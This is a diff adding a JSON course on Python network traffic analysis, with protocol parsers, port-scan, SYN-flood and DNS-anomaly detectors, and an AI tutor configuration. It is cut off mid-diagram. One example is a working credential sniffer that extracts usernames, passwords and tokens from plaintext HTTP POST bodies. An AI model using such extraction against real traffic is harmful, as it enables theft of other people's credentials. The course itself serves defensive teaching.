@@ -1,0 +1,1599 @@
+{
+  "course_id": "py_network_analysis",
+  "title": "Network Traffic Analysis & Packet Forensics",
+  "description": "Capture, parse, and analyse network traffic with Python. Decode protocols, detect anomalies, build intrusion detection tools, and investigate network-based attacks.",
+  "difficulty": "INTERMEDIATE",
+  "estimated_hours": 12,
+  "prerequisites": [
+    "py_hex_ascii_encoding",
+    "py_files_io"
+  ],
+  "learning_outcomes": [
+    "Understand the TCP/IP model and packet structure at every layer",
+    "Parse raw network packets using Python socket and struct modules",
+    "Analyse PCAP files programmatically for forensic investigation",
+    "Detect port scans, SYN floods, and brute-force attacks in traffic",
+    "Extract HTTP requests, DNS queries, and credentials from captures",
+    "Build network monitoring tools: packet sniffer, bandwidth tracker",
+    "Identify anomalous traffic patterns using statistical analysis",
+    "Decode protocol headers: Ethernet, IP, TCP, UDP, ICMP, DNS, HTTP",
+    "Implement simple intrusion detection signatures in Python",
+    "Generate network forensic reports from traffic analysis"
+  ],
+  "neurodivergent_design": {
+    "visual_first": true,
+    "analogy_based": true,
+    "progressive_difficulty": true,
+    "colour_coded_sections": true,
+    "short_focused_exercises": true,
+    "immediate_feedback": true,
+    "multiple_explanation_styles": true,
+    "estimated_focus_time_per_exercise": "3-5 minutes"
+  },
+  "ai_tutor_config": {
+    "personality": "Encouraging, patient, uses real-world analogies. Never judges. Celebrates small wins. Connects concepts to real network investigations and cyber defence.",
+    "intervention_triggers": {
+      "idle_40_seconds": "Network packets can seem like a wall of hex -- but each byte has a purpose! Want me to colour-code the layers for you?",
+      "idle_90_seconds": "Still thinking? Packet headers follow a strict format. Let me walk through one byte-by-byte, like reading an envelope before opening the letter.",
+      "idle_180_seconds": "No rush! Would you like to start with a simpler exercise? We can trace a single TCP handshake step by step.",
+      "first_error": "Almost! Network parsing is very precise -- one byte off and everything shifts. Let me show you where the offset went wrong...",
+      "repeated_errors": "Packet structures are tricky -- even experienced analysts double-check offsets! Let me explain with a completely different diagram.",
+      "after_success": "Brilliant! You just decoded network traffic the way SOC analysts do when investigating real security incidents!"
+    },
+    "encouragement_phrases": [
+      "You are reading packets like a network detective now!",
+      "That protocol decode was spot on -- SOC analysts do exactly this!",
+      "You detected an attack pattern in raw traffic -- real blue team skills!",
+      "That traffic analysis could catch a data breach in progress!",
+      "You built a working packet parser -- professional-grade tooling!",
+      "DNS analysis is how threat hunters track command-and-control channels!",
+      "Your IDS signature just caught a real attack pattern!",
+      "Network forensics is the backbone of incident response -- you are building it!"
+    ],
+    "explanation_styles": {
+      "analogy": "A network packet is like a postal letter: the Ethernet header is the outer envelope, the IP header is the address label, the TCP header is the tracking number, and the payload is the actual letter.",
+      "visual": "Picture traffic as layers of wrapping: Ethernet (outer box) wraps IP (inner box) wraps TCP/UDP (envelope) wraps data (letter). Each layer adds its own header.",
+      "step_by_step": "To analyse a packet: (1) Read Ethernet header (14 bytes), (2) Parse IP header (20+ bytes), (3) Parse TCP/UDP header (ports, flags), (4) Extract payload data.",
+      "code_trace": "struct.unpack('!6s6sH', raw[:14]) unpacks Ethernet: 6-byte dest MAC, 6-byte src MAC, 2-byte EtherType. '!' means network byte order (big-endian).",
+      "comparison": "TCP vs UDP: TCP is registered mail with tracking. UDP is dropping a postcard in a mailbox -- fast but no guarantee."
+    }
+  },
+  "lessons": [
+    {
+      "lesson_id": "py_network_analysis_lesson_1",
+      "title": "Network Traffic Analysis & Packet Forensics",
+      "theory": {
+        "introduction": "Every action on the internet generates network traffic -- web browsing, email, file transfers, and unfortunately, cyber attacks. This traffic flows as packets: small chunks of data wrapped in headers that tell routers where to send them.\n\nNetwork forensics is the art of capturing, parsing, and analysing these packets to reconstruct events, detect attacks, and gather evidence. When a breach occurs, network traffic logs are often the most valuable evidence -- they show exactly what data left the network, which systems communicated with attacker infrastructure, and how the attack unfolded.\n\nIn this course you will learn to read packets at the byte level, decode every major protocol (Ethernet, IP, TCP, UDP, DNS, HTTP, ICMP), detect attack patterns like port scans and brute-force attempts, and build your own analysis tools in Python. These are the same techniques used by SOC analysts, incident responders, and digital forensic investigators worldwide.",
+        "why_important": "Network traffic analysis is the foundation of cyber defence. Firewalls, IDS, and SIEM platforms all analyse packet headers and payloads. SOC analysts spend most of their day investigating suspicious traffic. Without understanding packets at the byte level, you cannot investigate breaches, configure security tools, or understand how attacks work on the wire.",
+        "key_concepts": [
+          {
+            "concept": "The TCP/IP Model -- Four Layers",
+            "explanation": "The TCP/IP model has four layers: (1) Link -- Ethernet frames, MAC addresses. (2) Internet -- IP packets, routing. (3) Transport -- TCP/UDP, port numbers. (4) Application -- HTTP, DNS, SSH. Each layer wraps the one above, adding its header. This is encapsulation.",
+            "example": "layers = {'Link':'Ethernet: MAC addresses','Internet':'IP: routing','Transport':'TCP/UDP: ports','Application':'HTTP/DNS: data'}\nfor l,d in layers.items(): print(f'[{l:12s}] {d}')",
+            "ai_hint": "Like a letter: Application=letter, Transport=envelope with tracking, Internet=address, Link=postal van."
+          },
+          {
+            "concept": "Ethernet Frames -- The Physical Envelope",
+            "explanation": "Ethernet header is 14 bytes: 6B destination MAC, 6B source MAC, 2B EtherType (0x0800=IPv4, 0x0806=ARP, 0x86DD=IPv6). MAC addresses are hardware addresses like AA:BB:CC:DD:EE:FF. Switches use them for local delivery.",
+            "example": "import struct\neth = b'\\x11\\x22\\x33\\x44\\x55\\x66\\xAA\\xBB\\xCC\\xDD\\xEE\\xFF\\x08\\x00'\ndst,src,t = struct.unpack('!6s6sH', eth)\nprint(f'Dst: {dst.hex(\":\")} Src: {src.hex(\":\")} Type: 0x{t:04X}')",
+            "ai_hint": "Ethernet is the outermost wrapper. Routers strip and replace it at each hop."
+          },
+          {
+            "concept": "IP Headers -- Routing Across Networks",
+            "explanation": "IPv4 header (min 20 bytes): version, header length, TTL, protocol (6=TCP, 17=UDP, 1=ICMP), source IP, destination IP. TTL decrements at each router, preventing infinite loops. Protocol field identifies the next layer.",
+            "example": "import struct, socket\nip = b'\\x45\\x00\\x00\\x3c\\x00\\x00\\x40\\x00\\x40\\x06\\x00\\x00'\nip += socket.inet_aton('192.168.1.100') + socket.inet_aton('93.184.216.34')\nprint(f'TTL={ip[8]} Proto={ip[9]} {socket.inet_ntoa(ip[12:16])}->{socket.inet_ntoa(ip[16:20])}')",
+            "ai_hint": "IP header is the address label. TTL is a stamina counter -- when it hits 0, the packet dies."
+          },
+          {
+            "concept": "TCP Headers -- Reliable Delivery",
+            "explanation": "TCP header (20+ bytes): src port, dst port, sequence number, ack number, flags (SYN, ACK, FIN, RST, PSH), window size. Three-way handshake: SYN -> SYN-ACK -> ACK. Common ports: 80=HTTP, 443=HTTPS, 22=SSH. TCP flags are crucial for detecting attacks.",
+            "example": "import struct\ntcp = struct.pack('!HHIIBBHHH', 52431, 443, 1000, 0, 0x50, 0x02, 65535, 0, 0)\nprint(f'Port {struct.unpack(\"!H\",tcp[:2])[0]} -> {struct.unpack(\"!H\",tcp[2:4])[0]}')\nprint(f'Flags: SYN' if tcp[13] & 0x02 else '')",
+            "ai_hint": "SYN=knock, SYN-ACK=door opens, ACK=handshake done. Thousands of SYN without ACK = SYN flood attack!"
+          },
+          {
+            "concept": "UDP Headers -- Fast, No Guarantees",
+            "explanation": "UDP header is just 8 bytes: src port, dst port, length, checksum. No handshake, no retransmission. Used for DNS (53), DHCP, streaming, gaming. Faster than TCP but unreliable.",
+            "example": "import struct\nudp = struct.pack('!HHHH', 12345, 53, 20, 0)\nprint(f'UDP: {struct.unpack(\"!HH\",udp[:4])}')",
+            "ai_hint": "UDP is fire-and-forget, like shouting across a room. TCP is a phone call with confirmation."
+          },
+          {
+            "concept": "DNS Protocol -- The Internet Phone Book",
+            "explanation": "DNS translates domains to IPs on port 53 (UDP). Names encoded as length-prefixed labels: 3www6google3com0. Monitoring DNS reveals every site a machine contacts -- essential for detecting C2 traffic.",
+            "example": "dns = b'\\x03www\\x06google\\x03com\\x00'\nlabels, i = [], 0\nwhile dns[i]: labels.append(dns[i+1:i+1+dns[i]].decode()); i+=1+dns[i]\nprint('.'.join(labels))",
+            "ai_hint": "Every website visit starts with DNS. Malware uses DNS to phone home -- that is why DNS monitoring is essential."
+          },
+          {
+            "concept": "HTTP Protocol -- Web Traffic",
+            "explanation": "HTTP is text-based on port 80. Requests: method, path, headers. Responses: status code, headers, body. POST bodies in plaintext HTTP expose credentials. HTTPS encrypts payload but DNS/IPs remain visible.",
+            "example": "req = b'GET /login HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\nlines = req.decode().split('\\r\\n')\nprint(f'Method: {lines[0].split()[0]} Path: {lines[0].split()[1]}')",
+            "ai_hint": "HTTP is plain text -- before HTTPS, anyone could read passwords. Even with HTTPS, DNS shows which site you visit."
+          },
+          {
+            "concept": "ICMP -- Ping and Diagnostics",
+            "explanation": "ICMP handles diagnostics: Type 8=Echo Request (ping), Type 0=Echo Reply, Type 3=Dest Unreachable, Type 11=Time Exceeded (traceroute). Can be abused for floods, tunnelling, and OS fingerprinting.",
+            "example": "import struct\nicmp = struct.pack('!BBHHH', 8, 0, 0, 1234, 1)\nprint(f'ICMP Type={icmp[0]} (Echo Request) ID={struct.unpack(\"!H\",icmp[4:6])[0]}')",
+            "ai_hint": "ICMP is the postal service returning 'address not found'. Ping sends Echo Request, server returns Echo Reply."
+          },
+          {
+            "concept": "Port Scan Detection",
+            "explanation": "Port scanning probes open ports -- first step of most attacks. Types: TCP Connect, SYN scan, UDP scan, FIN/Xmas. Detection: one source hitting many ports on one target in seconds, SYN without ACK completion.",
+            "example": "from collections import defaultdict\nscans = defaultdict(set)\nfor p in range(1,1025): scans[('10.0.0.1','192.168.1.5')].add(p)\nfor k,ports in scans.items():\n    if len(ports)>100: print(f'SCAN: {k[0]}->{k[1]} {len(ports)} ports')",
+            "ai_hint": "Port scanning is like a burglar trying every window. 1000 ports in seconds = automated scanner."
+          },
+          {
+            "concept": "SYN Flood Detection",
+            "explanation": "SYN flood sends thousands of SYNs without completing handshakes, exhausting connection tables. Detect by counting SYN-to-ACK ratio per source. Normal ratio near 1.0; flood ratio near 0.",
+            "example": "syns, acks = 2000, 15\nratio = acks/syns\nprint(f'SYNs={syns} ACKs={acks} Ratio={ratio:.3f}')\nif ratio < 0.3: print('SYN FLOOD detected!')",
+            "ai_hint": "SYN flood = ringing 1000 doorbells and running away. Server allocates resources for each but nobody completes the handshake."
+          },
+          {
+            "concept": "Brute-Force Detection",
+            "explanation": "Brute-force shows as many connections from one IP to the same port (SSH=22, RDP=3389) with short durations and failed auth. Count attempts per source-destination-port tuple within time windows.",
+            "example": "from collections import Counter\nattempts = Counter()\nfor _ in range(150): attempts[('10.0.0.50','192.168.1.10',22)] += 1\nfor k,c in attempts.items():\n    if c>20: print(f'BRUTE FORCE: {k} = {c} attempts')",
+            "ai_hint": "150 SSH connections from one IP in minutes = automated password attack."
+          },
+          {
+            "concept": "Network Forensic Reporting",
+            "explanation": "Reports document: time range, packet/byte totals, unique hosts, protocol distribution, detected anomalies, evidence timeline. Must be factual, reproducible, and suitable for legal proceedings.",
+            "example": "print('=== NETWORK REPORT ===')\nprint('Packets: 10,000 | Bytes: 5,000,000')\nprint('Unique IPs: 45 | Protocols: TCP 80%, UDP 15%, ICMP 5%')\nprint('Alerts: SYN flood from 10.0.0.99')",
+            "ai_hint": "A forensic report answers: What happened? When? Who was involved? Every claim needs packet evidence."
+          }
+        ]
+      },
+      "complete_examples": [
+        {
+          "title": "Example 1: Ethernet Frame Parser",
+          "description": "Parse raw Ethernet frame into MACs and EtherType",
+          "difficulty": "beginner",
+          "code": "import struct\ndef parse_ethernet(frame):\n    dst, src, proto = struct.unpack('!6s6sH', frame[:14])\n    print(f'Dst: {\":\".join(f\"{b:02x}\" for b in dst)}')\n    print(f'Src: {\":\".join(f\"{b:02x}\" for b in src)}')\n    types = {0x0800:'IPv4',0x0806:'ARP',0x86DD:'IPv6'}\n    print(f'Type: 0x{proto:04X} ({types.get(proto,\"?\")})')\n    return frame[14:]\n\nframe = b'\\x11\\x22\\x33\\x44\\x55\\x66\\xAA\\xBB\\xCC\\xDD\\xEE\\xFF\\x08\\x00' + b'\\x00'*20\nparse_ethernet(frame)",
+          "output": "Dst: 11:22:33:44:55:66\nSrc: aa:bb:cc:dd:ee:ff\nType: 0x0800 (IPv4)",
+          "ai_explanation": "struct.unpack('!6s6sH',...) reads 6B dst MAC, 6B src MAC, 2B type. Format each byte as hex with colon separators.",
+          "ai_challenge": "Add VLAN tag detection when EtherType is 0x8100."
+        },
+        {
+          "title": "Example 2: IPv4 Header Parser",
+          "description": "Extract IP version, TTL, protocol, and addresses",
+          "difficulty": "beginner",
+          "code": "import struct, socket\ndef parse_ip(data):\n    v = data[0] >> 4; ihl = (data[0] & 0xF)*4\n    ttl = data[8]; proto = data[9]\n    src = socket.inet_ntoa(data[12:16])\n    dst = socket.inet_ntoa(data[16:20])\n    p = {1:'ICMP',6:'TCP',17:'UDP'}.get(proto,'?')\n    print(f'IPv{v} TTL={ttl} Proto={proto}({p}) {src}->{dst}')\n    return data[ihl:]\n\nip = b'\\x45\\x00\\x00\\x3c\\x00\\x00\\x40\\x00\\x40\\x06\\x00\\x00'\nip += socket.inet_aton('192.168.1.100') + socket.inet_aton('93.184.216.34')\nparse_ip(ip)",
+          "output": "IPv4 TTL=64 Proto=6(TCP) 192.168.1.100->93.184.216.34",
+          "ai_explanation": "First nibble=version(4), second nibble=header length in 32-bit words (*4 for bytes). Byte 8=TTL, byte 9=protocol, bytes 12-19 are IPs.",
+          "ai_challenge": "Add IP options parsing when IHL > 5."
+        },
+        {
+          "title": "Example 3: TCP Header Parser with Flags",
+          "description": "Parse TCP header and decode all flag bits",
+          "difficulty": "intermediate",
+          "code": "import struct\ndef parse_tcp(data):\n    sp, dp = struct.unpack('!HH', data[:4])\n    seq = struct.unpack('!I', data[4:8])[0]\n    ack = struct.unpack('!I', data[8:12])[0]\n    fb = data[13]\n    flags = [n for m,n in [(0x02,'SYN'),(0x10,'ACK'),(0x01,'FIN'),(0x04,'RST'),(0x08,'PSH')] if fb&m]\n    win = struct.unpack('!H', data[14:16])[0]\n    print(f'{sp}->{dp} Seq={seq} Ack={ack} [{\"|\".join(flags)}] Win={win}')\n\ntcp = struct.pack('!HHIIBBHHH', 52431, 443, 1000, 0, 0x50, 0x12, 65535, 0, 0)\nparse_tcp(tcp)",
+          "output": "52431->443 Seq=1000 Ack=0 [SYN|ACK] Win=65535",
+          "ai_explanation": "TCP byte 13 contains flags. SYN=0x02, ACK=0x10, FIN=0x01, RST=0x04, PSH=0x08. SYN|ACK together means connection accepted.",
+          "ai_challenge": "Build a 3-way handshake simulator generating SYN, SYN-ACK, ACK packets."
+        },
+        {
+          "title": "Example 4: UDP Parser",
+          "description": "Parse UDP datagram with service identification",
+          "difficulty": "beginner",
+          "code": "import struct\ndef parse_udp(data):\n    s,d,l,c = struct.unpack('!HHHH', data[:8])\n    svc = {53:'DNS',67:'DHCP-S',68:'DHCP-C',123:'NTP',161:'SNMP',514:'Syslog'}.get(d,'?')\n    print(f'UDP {s}->{d}({svc}) Len={l} Payload={l-8}B')\n\nudp = struct.pack('!HHHH', 54321, 53, 30, 0) + b'\\x00'*22\nparse_udp(udp)",
+          "output": "UDP 54321->53(DNS) Len=30 Payload=22B",
+          "ai_explanation": "UDP is just 8 bytes: src port, dst port, length, checksum. Port 53=DNS. Payload starts immediately after.",
+          "ai_challenge": "Add service detection for 20+ common ports."
+        },
+        {
+          "title": "Example 5: DNS Query Decoder",
+          "description": "Decode DNS query packet including domain name",
+          "difficulty": "intermediate",
+          "code": "import struct\ndef decode_name(data, off):\n    labels = []\n    while off < len(data) and data[off]:\n        if data[off] >= 192:\n            ptr = ((data[off]&0x3F)<<8)|data[off+1]\n            n,_ = decode_name(data,ptr); labels.append(n); off+=2; break\n        l = data[off]; off+=1\n        labels.append(data[off:off+l].decode()); off+=l\n    else: off+=1\n    return '.'.join(labels), off\n\ndef parse_dns(data):\n    txid,flags,qc = struct.unpack('!HHH', data[:6])\n    print(f'DNS {\"Resp\" if flags>>15 else \"Query\"} ID=0x{txid:04X} Qs={qc}')\n    off = 12\n    for _ in range(qc):\n        name,off = decode_name(data,off)\n        qt = struct.unpack('!H',data[off:off+2])[0]; off+=4\n        print(f'  {name} Type={{1:\"A\",28:\"AAAA\",5:\"CNAME\",15:\"MX\"}.get(qt,qt)}')\n\ndns = struct.pack('!HHHHHH', 0x1234, 0x0100, 1, 0, 0, 0)\ndns += b'\\x03www\\x06google\\x03com\\x00' + struct.pack('!HH', 1, 1)\nparse_dns(dns)",
+          "output": "DNS Query ID=0x1234 Qs=1\n  www.google.com Type=A",
+          "ai_explanation": "DNS names encode as length-prefixed labels: 3www6google3com0. Transaction ID matches queries to responses. Type A=IPv4 address.",
+          "ai_challenge": "Add answer section parsing to decode DNS responses with IPs."
+        },
+        {
+          "title": "Example 6: HTTP Request Parser",
+          "description": "Parse raw HTTP into method, path, headers, body",
+          "difficulty": "intermediate",
+          "code": "import re\ndef parse_http(data):\n    text = data.decode('utf-8',errors='replace')\n    parts = text.split('\\r\\n\\r\\n', 1)\n    headers_text, body = parts[0], parts[1] if len(parts)>1 else ''\n    lines = headers_text.split('\\r\\n')\n    method, path = lines[0].split(' ')[:2]\n    hdrs = {}\n    for l in lines[1:]:\n        if ':' in l: k,v=l.split(':',1); hdrs[k.strip()]=v.strip()\n    print(f'{method} {path}')\n    for k,v in hdrs.items(): print(f'  {k}: {v}')\n    if body: print(f'Body: {body}')\n\nparse_http(b'POST /login HTTP/1.1\\r\\nHost: app.com\\r\\nCookie: s=abc\\r\\n\\r\\nuser=admin&pass=secret')",
+          "output": "POST /login\n  Host: app.com\n  Cookie: s=abc\nBody: user=admin&pass=secret",
+          "ai_explanation": "HTTP is text: request line, headers (key: value), blank line, body. POST credentials in plaintext HTTP are visible to anyone on the network.",
+          "ai_challenge": "Extract individual form fields from URL-encoded POST body."
+        },
+        {
+          "title": "Example 7: ICMP Packet Parser",
+          "description": "Parse ICMP packets for ping and error analysis",
+          "difficulty": "beginner",
+          "code": "import struct\ndef parse_icmp(data):\n    t,c,cs = struct.unpack('!BBH', data[:4])\n    names = {0:'Reply',3:'Unreachable',8:'Request',11:'Time Exceeded'}\n    print(f'ICMP {names.get(t,f\"T{t}\")} code={c}')\n    if t in (0,8):\n        i,s = struct.unpack('!HH', data[4:8])\n        print(f'  ID={i} Seq={s}')\n\nfor t,c in [(8,0),(0,0),(3,1),(11,0)]:\n    parse_icmp(struct.pack('!BBHHH',t,c,0,100,1)+b'\\x00'*8)",
+          "output": "ICMP Request code=0\n  ID=100 Seq=1\nICMP Reply code=0\n  ID=100 Seq=1\nICMP Unreachable code=1\nICMP Time Exceeded code=0",
+          "ai_explanation": "Type+code together identify the message. 8/0=ping request, 0/0=ping reply, 3/1=host unreachable. Type 11 is used by traceroute.",
+          "ai_challenge": "Build a ping response generator that creates matching Reply for each Request."
+        },
+        {
+          "title": "Example 8: Port Scan Detector",
+          "description": "Detect port scanning from connection patterns",
+          "difficulty": "intermediate",
+          "code": "from collections import defaultdict\ndef detect_scan(conns, threshold=15):\n    scanners = defaultdict(set)\n    for src,dst,port,flags in conns:\n        if 'SYN' in flags: scanners[(src,dst)].add(port)\n    for (s,d),ports in scanners.items():\n        if len(ports) >= threshold:\n            print(f'PORT SCAN: {s}->{d} ({len(ports)} ports)')\n            print(f'  Sample: {sorted(ports)[:10]}...')\n\nconns = [('10.0.0.50','192.168.1.10',p,['SYN']) for p in range(1,1025)]\ndetect_scan(conns)",
+          "output": "PORT SCAN: 10.0.0.50->192.168.1.10 (1024 ports)\n  Sample: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]...",
+          "ai_explanation": "Groups unique destination ports per source-target pair. 1024 ports from one IP = automated scan. Real IDS adds time windowing and flag analysis.",
+          "ai_challenge": "Add scan type detection: SYN scan vs Connect scan vs FIN scan."
+        },
+        {
+          "title": "Example 9: SYN Flood Detector",
+          "description": "Detect SYN flood DDoS by flag ratio analysis",
+          "difficulty": "intermediate",
+          "code": "from collections import defaultdict\ndef detect_flood(pkts, thresh=50):\n    stats = defaultdict(lambda:{'syn':0,'ack':0})\n    for src,dst,flags in pkts:\n        if 'SYN' in flags and 'ACK' not in flags: stats[src]['syn']+=1\n        if 'ACK' in flags: stats[src]['ack']+=1\n    for ip,s in stats.items():\n        if s['syn']>=thresh:\n            r = s['ack']/s['syn'] if s['syn'] else 1\n            if r < 0.3:\n                print(f'SYN FLOOD: {ip} SYNs={s[\"syn\"]} ACKs={s[\"ack\"]} ratio={r:.2f}')\n\npkts = [('10.0.0.99','192.168.1.1',['SYN'])]*2000\npkts += [('10.0.0.99','192.168.1.1',['ACK'])]*15\ndetect_flood(pkts)",
+          "output": "SYN FLOOD: 10.0.0.99 SYNs=2000 ACKs=15 ratio=0.01",
+          "ai_explanation": "2000 SYNs but only 15 ACKs = 0.8% completion. Normal traffic is near 100%. This is classic SYN flood denial-of-service.",
+          "ai_challenge": "Add per-target tracking for distributed DDoS detection."
+        },
+        {
+          "title": "Example 10: DNS Traffic Analyser",
+          "description": "Analyse DNS queries and flag suspicious domains",
+          "difficulty": "intermediate",
+          "code": "from collections import defaultdict\nimport re\ndef analyse_dns(queries):\n    counts = defaultdict(int)\n    suspicious = []\n    for domain,qtype,ts in queries:\n        counts[domain] += 1\n        flags = []\n        if len(domain)>50: flags.append('LONG')\n        if re.search(r'[0-9a-f]{16,}',domain): flags.append('HEX')\n        if domain.count('.')>5: flags.append('DEEP')\n        if domain.split('.')[-1] in ('tk','ml','ga','cf'): flags.append('SUSPECT_TLD')\n        if flags: suspicious.append((domain, flags))\n    print(f'Queries: {len(queries)} | Unique: {len(counts)}')\n    for d,c in sorted(counts.items(),key=lambda x:-x[1])[:5]: print(f'  {c:4d} {d}')\n    if suspicious:\n        print('SUSPICIOUS:')\n        for d,f in suspicious: print(f'  {d} [{\"|\".join(f)}]')\n\nanalyse_dns([('google.com','A',1),('google.com','A',2),('a1b2c3d4e5f6a7b8.evil.tk','A',3)])",
+          "output": "Queries: 3 | Unique: 2\n     2 google.com\n     1 a1b2c3d4e5f6a7b8.evil.tk\nSUSPICIOUS:\n  a1b2c3d4e5f6a7b8.evil.tk [HEX|SUSPECT_TLD]",
+          "ai_explanation": "Flags hex subdomains (encoded data), suspicious TLDs (.tk,.ml), and deep subdomains (DNS tunnelling). This is DNS-based threat intelligence.",
+          "ai_challenge": "Add DGA detection using entropy analysis on domain names."
+        },
+        {
+          "title": "Example 11: Connection Flow Tracker",
+          "description": "Group packets into flows and summarise",
+          "difficulty": "intermediate",
+          "code": "from collections import defaultdict\ndef track_flows(pkts):\n    flows = defaultdict(lambda:{'n':0,'bytes':0})\n    for p in pkts:\n        k = (p['src'],p['dst'],p.get('dp',0),p['proto'])\n        flows[k]['n']+=1; flows[k]['bytes']+=p['size']\n    print(f'Flows: {len(flows)}')\n    for (s,d,dp,pr),i in sorted(flows.items(),key=lambda x:-x[1]['bytes']):\n        print(f'  {s}->{d}:{dp}({pr}) pkts={i[\"n\"]} bytes={i[\"bytes\"]:,}')\n\npkts = [{'src':'10.0.0.1','dst':'93.184.216.34','dp':443,'proto':'TCP','size':1200}]*50\npkts += [{'src':'10.0.0.1','dst':'8.8.8.8','dp':53,'proto':'UDP','size':64}]*10\ntrack_flows(pkts)",
+          "output": "Flows: 2\n  10.0.0.1->93.184.216.34:443(TCP) pkts=50 bytes=60,000\n  10.0.0.1->8.8.8.8:53(UDP) pkts=10 bytes=640",
+          "ai_explanation": "Flow tracking groups by 5-tuple. HTTPS flow transferred 60KB. This is how firewalls and SIEMs summarise activity.",
+          "ai_challenge": "Add bidirectional flow merging for full conversations."
+        },
+        {
+          "title": "Example 12: Credential Sniffer (Educational)",
+          "description": "Extract credentials from unencrypted HTTP POST",
+          "difficulty": "advanced",
+          "code": "import re\ndef extract_creds(http_list):\n    for data in http_list:\n        t = data if isinstance(data,str) else data.decode('utf-8',errors='replace')\n        if not t.startswith('POST'): continue\n        host = re.search(r'Host:\\s*([^\\r\\n]+)',t)\n        body = t.split('\\r\\n\\r\\n')[-1] if '\\r\\n\\r\\n' in t else ''\n        creds = {}\n        for f in ['username','password','email','pass','token']:\n            m = re.search(rf'{f}[=:]([^&\\r\\n]+)',body,re.I)\n            if m: creds[f] = m.group(1)\n        if creds:\n            print(f'POST {host.group(1) if host else \"?\"}')\n            for k,v in creds.items(): print(f'  {k}={v}')\n\nextract_creds(['POST /login HTTP/1.1\\r\\nHost: bank.com\\r\\n\\r\\nusername=admin&password=P@ss!'])",
+          "output": "POST bank.com\n  username=admin\n  password=P@ss!",
+          "ai_explanation": "POST bodies in HTTP are plaintext. This extracts common credential fields. This is why HTTPS is essential.",
+          "ai_challenge": "Add Basic auth header decoding (Authorization: Basic base64)."
+        },
+        {
+          "title": "Example 13: Network Anomaly Detector",
+          "description": "Statistical anomaly detection in traffic",
+          "difficulty": "advanced",
+          "code": "import math\nfrom collections import defaultdict\ndef detect_anomaly(pkts, z_thresh=2.0):\n    mins = defaultdict(int)\n    for p in pkts: mins[int(p['ts'])//60] += 1\n    vals = list(mins.values())\n    if len(vals)<3: return\n    mean = sum(vals)/len(vals)\n    std = math.sqrt(sum((v-mean)**2 for v in vals)/len(vals)) or 1\n    for m,c in mins.items():\n        z = (c-mean)/std\n        if abs(z)>=z_thresh:\n            print(f'ANOMALY min {m}: count={c} mean={mean:.0f} z={z:.1f}')\n\nimport time; t=time.time()\npkts = [{'ts':t+m*60+i} for m in range(10) for i in range(20 if m!=5 else 500)]\ndetect_anomaly(pkts)",
+          "output": "ANOMALY min 5: count=500 mean=68 z=3.0",
+          "ai_explanation": "Z-score measures standard deviations from mean. 500 packets when average is 68 = z=3.0, clear spike. Catches attacks without specific signatures.",
+          "ai_challenge": "Add per-protocol anomaly detection with sliding time windows."
+        },
+        {
+          "title": "Example 14: Network Forensic Report Generator",
+          "description": "Generate comprehensive forensic report from packet data",
+          "difficulty": "advanced",
+          "code": "from collections import defaultdict\nfrom datetime import datetime\ndef report(pkts):\n    protos=defaultdict(int); srcs=defaultdict(int); ports=defaultdict(int); total=0; syns=defaultdict(int)\n    for p in pkts:\n        protos[p['proto']]+=1; srcs[p['src']]+=1; ports[p.get('dp',0)]+=1; total+=p['size']\n        if p.get('flags')==['SYN']: syns[p['src']]+=1\n    print('='*50)\n    print('NETWORK FORENSIC REPORT')\n    print(f'Packets: {len(pkts):,} | Bytes: {total:,}')\n    print('\\nProtocols:')\n    for p,c in sorted(protos.items(),key=lambda x:-x[1]):\n        print(f'  {p}: {c} ({c/len(pkts)*100:.0f}%)')\n    print('\\nTop Talkers:')\n    for ip,c in sorted(srcs.items(),key=lambda x:-x[1])[:5]: print(f'  {ip}: {c}')\n    svcs={80:'HTTP',443:'HTTPS',22:'SSH',53:'DNS'}\n    print('\\nTop Ports:')\n    for port,c in sorted(ports.items(),key=lambda x:-x[1])[:5]: print(f'  {port}({svcs.get(port,\"?\")}):{c}')\n    alerts = [f'SYN flood from {ip} ({c} SYNs)' for ip,c in syns.items() if c>50]\n    if alerts:\n        print('\\nALERTS:')\n        for a in alerts: print(f'  {a}')\n    print('='*50)\n\npkts=[{'src':'10.0.0.1','dst':'93.184.216.34','proto':'TCP','dp':443,'size':1200,'flags':['ACK']}]*200\npkts+=[{'src':'10.0.0.1','dst':'8.8.8.8','proto':'UDP','dp':53,'size':64,'flags':[]}]*50\npkts+=[{'src':'10.0.0.99','dst':'192.168.1.1','proto':'TCP','dp':22,'size':60,'flags':['SYN']}]*100\nreport(pkts)",
+          "output": "==================================================\nNETWORK FORENSIC REPORT\nPackets: 350 | Bytes: 312,000\n\nProtocols:\n  TCP: 300 (86%)\n  UDP: 50 (14%)\n\nTop Talkers:\n  10.0.0.1: 250\n  10.0.0.99: 100\n\nTop Ports:\n  443(HTTPS):200\n  22(SSH):100\n  53(DNS):50\n\nALERTS:\n  SYN flood from 10.0.0.99 (100 SYNs)\n==================================================",
+          "ai_explanation": "Full report: packets, bytes, protocols, top talkers, ports, and automated alerts. SYN flood flagged automatically. This format is used in incident response briefings.",
+          "ai_challenge": "Add timeline, geo IP lookup, and CSV export for SIEM ingestion."
+        }
+      ],
+      "visual_diagram": {
+        "title": "Network Traffic Analysis — Complete Reference Flowchart",
+        "content": "<div style=\"font-family: monospace; line-height: 1.8; padding: 20px; max-width: 900px;\">\n<h2 style=\"color: #e74c3c;\">🌐 Network Traffic Analysis — Complete Reference</h2>\n\n<div style=\"background: #1a1a2e; padding: 20px; border-radius: 12px; margin: 15px 0;\">\n<h3 style=\"color: #3498db;\">📦 Packet Encapsulation (Layers)</h3>\n<pre style=\"color: #ecf0f1;\">\n  ┌─────────────────────────────────────────────────────┐\n  │ <span style=\"background: #9b59b6; color: white; padding: 2px 8px; border-radius: 3px;\">ETHERNET</span> (14B) dst MAC | src MAC | EtherType       │\n  │  ┌──────────────────────────────────────────────┐   │\n  │  │ <span style=\"background: #3498db; color: white; padding: 2px 8px; border-radius: 3px;\">IP</span> (20B+) ver | TTL | proto | src IP | dst IP  │   │\n  │  │  ┌───────────────────────────────────────┐   │   │\n  │  │  │ <span style=\"background: #2ecc71; color: white; padding: 2px 8px; border-radius: 3px;\">TCP</span> (20B+) src port | dst port | flags │   │   │\n  │  │  │  ┌────────────────────────────────┐   │   │   │\n  │  │  │  │ <span style=\"background: #f39c12; color: white; padding: 2px 8px; border-radius: 3px;\">PAYLOAD</span> (HTTP, DNS, etc.)    │   │   │   │\n  │  │  │  └────────────────────────────────┘   │   │   │\n  │  │  └───────────────────────────────────────┘   │   │\n  │  └──────────────────────────────────────────────┘   │\n  